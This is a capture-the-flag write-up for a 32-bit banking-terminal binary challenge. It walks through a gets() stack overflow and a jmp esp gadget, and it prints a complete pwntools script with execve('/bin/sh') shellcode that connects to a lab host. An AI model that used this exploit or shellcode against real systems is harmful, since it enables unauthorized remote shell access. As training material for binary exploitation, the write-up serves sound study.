# GlobalCash ATM — bank_chall

**Category:** PWN (Binary Exploitation)  
**Difficulty:** Easy  
**Platform:** CTFzone Labs  
**Date:** 2026-03-19  
**Flag:** `urchinsec{...}`

---

## Challenge Description

A 32-bit banking terminal application running on a remote server. Users can log in, deposit, and withdraw money. After a successful withdrawal the program asks for a transaction comment — and that feedback prompt contains a classic unprotected stack buffer overflow.

---

## Enumeration

```bash
file bank_chall
# ELF 32-bit LSB executable, Intel 80386, dynamically linked, stripped

checksec bank_chall
# Arch:     i386-32-little
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
```

| Protection | Status | Meaning |
|---|---|---|
| PIE | OFF | Fixed memory addresses |
| NX | OFF | Stack is executable — shellcode works |
| Stack Canary | OFF | No overflow detection |
| ASLR | OFF (CTF) | Predictable addresses |

Running the binary reveals a full ATM interface:

```
=== GLOBAL ATM INTERFACE ===
--- ATM LOGIN ---
Username: admin
Password: admin

1. Balance Inquiry
2. Deposit Funds
3. Withdraw Funds
4. Exit
```

The feedback prompt after a withdrawal is the only place `gets()` is called.

---

## Vulnerability

Disassembling the feedback function at `0x080491e8`:

```asm
sub    esp, 0x44        ; allocates 68 bytes on stack
lea    eax, [ebp-0x48]  ; buffer at ebp-72
push   eax
call   gets@plt          ; NO size limit — overflow here
```

Stack layout:

```
[ 68 bytes - feedback buffer   ]  ← gets() writes here
[  4 bytes - saved EBX         ]
[  4 bytes - saved EBP         ]
[  4 bytes - return address    ]  ← overwrite at offset 76
```

`gets()` reads until newline with no bounds check. Writing 76 bytes of junk overwrites the return address.

A `jmp esp` gadget exists at `0x080491e3`:

```bash
objdump -d bank_chall | grep "ff e4"
# 80491e3: ff e4    jmp esp
```

---

## Exploit

**Strategy:** ret2shellcode — NX is off so shellcode on the stack executes directly.

```
[ 76 x 'A' ]  ← fills buffer + saved registers + EBP
[ 0x080491e3 ]  ← jmp esp gadget — new return address
[ shellcode ]   ← ESP points here after ret
```

```python
from pwn import *

# 32-bit execve("/bin/sh") shellcode
shellcode  = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

jmp_esp = p32(0x080491e3)
padding = b'A' * 76
payload = padding + jmp_esp + shellcode

p = remote("labs.ctfzone.com", 6750)

p.sendlineafter(b'Username: ', b'admin')
p.sendlineafter(b'Password: ', b'admin')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'deposit: ', b'100')
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'amount: ', b'100')
p.sendlineafter(b'records:\n', payload)

p.interactive()
```

**Execution flow:**

```
gets() reads payload → stack overflowed
        ↓
feedback() executes ret
        ↓
CPU pops 0x080491e3 → jmp esp
        ↓
ESP points at shellcode → executes
        ↓
execve("/bin/sh") → shell as root
        ↓
cat flag.txt
```

---

## Key Takeaways

- **`gets()` is always vulnerable** — no safe use exists. Replace with `fgets(buf, sizeof(buf), stdin)`
- **NX off = shellcode works** — when the stack is executable you can inject and run your own machine code directly
- **`jmp esp` solves the address problem** — at the moment `ret` fires, ESP already points at your shellcode so you don't need to know its address
- **Application logic is part of the attack surface** — the overflow was only reachable after login, deposit, and withdrawal
- **No canary = silent overflow** — the program has no idea its return address was replaced until it is too late
